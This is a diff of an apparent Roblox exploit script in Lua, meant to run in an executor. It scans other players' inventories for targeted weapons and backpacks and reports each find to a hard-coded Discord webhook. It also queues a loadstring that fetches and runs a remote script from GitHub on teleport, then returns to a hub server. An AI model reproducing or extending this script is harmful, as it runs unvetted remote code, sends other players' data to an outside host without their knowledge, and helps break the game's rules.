@@ -7,7 +7,6 @@ local WEBHOOK_URL = "https://discord.com/api/webhooks/1514031008654295040/efj6sT
 local HUB_PLACE_ID = 15327728308
 local ITENS_ALVO = {"barret50", "renellim4", "m79", "backpacktier4", "fists"}
 
--- Função de envio
 local function sendToDiscord(msg)
     local req = syn and syn.request or http_request or request
     if req then
@@ -22,30 +21,35 @@ local function sendToDiscord(msg)
     end
 end
 
--- 1. CONFIGURA A FILA PARA EXECUTAR O HUB AO CHEGAR LÁ
+-- 1. PREPARA A FILA PARA EXECUTAR O HUB NA VOLTA
 local qt = queue_on_teleport or queueteleport or (syn and syn.queue_on_teleport)
 if qt then
-    -- Substitua pela URL do seu Script do Hub
     qt([[loadstring(game:HttpGet("https://raw.githubusercontent.com/cajiwghdtyasdnhatfy/Acaswartqaawr/refs/heads/main/Hub"))()]])
 end
 
--- 2. EXECUÇÃO DO SCANNER
-sendToDiscord("📢 SCANNER INICIADO no servidor: " .. game.PlaceId)
-task.wait(3)
+-- 2. TRAVA DE CARREGAMENTO
+if not game:IsLoaded() then
+    game.Loaded:Wait()
+end
 
-local found = {}
+sendToDiscord("📢 SCANNER INICIADO... Aguardando inventários carregarem.")
+-- Espera 10 segundos para dar tempo do servidor sincronizar os itens dos outros players
+task.wait(10) 
+
+local foundCount = 0
 
 for _, player in ipairs(Players:GetPlayers()) do
     if player == Players.LocalPlayer then continue end
     
-    local inv = player:FindFirstChild("GunInventory")
+    -- Espera até 3 segundos caso o inventário do player específico ainda esteja carregando
+    local inv = player:WaitForChild("GunInventory", 3)
     if inv then
         for _, obj in ipairs(inv:GetChildren()) do
             if obj:IsA("ObjectValue") and obj.Value then
                 local nome = obj.Value.Name
                 for _, alvo in ipairs(ITENS_ALVO) do
                     if nome and nome:lower():find(alvo:lower()) then
-                        local mag = obj:FindFirstChild("BulletsInMagazine") and obj.BulletsInMagazine.Value or 0
+                        foundCount = foundCount + 1
                         sendToDiscord("🔫 ENCONTRADO: " .. player.Name .. " | " .. nome)
                     end
                 end
@@ -55,12 +59,17 @@ for _, player in ipairs(Players:GetPlayers()) do
     
     local bp = player:GetAttribute("EquipmentBackpack")
     if bp and tostring(bp):lower():find("backpacktier4") then
+        foundCount = foundCount + 1
         sendToDiscord("🎒 BACKPACK: " .. player.Name)
     end
+end
+
+if foundCount == 0 then
+    sendToDiscord("✅ Nada encontrado neste servidor.")
 end
 
 sendToDiscord("🔄 Voltando para o hub...")
 task.wait(3)
 
--- 3. TELEPORTE
+-- 3. TELEPORTE DE VOLTA
 TeleportService:Teleport(HUB_PLACE_ID)
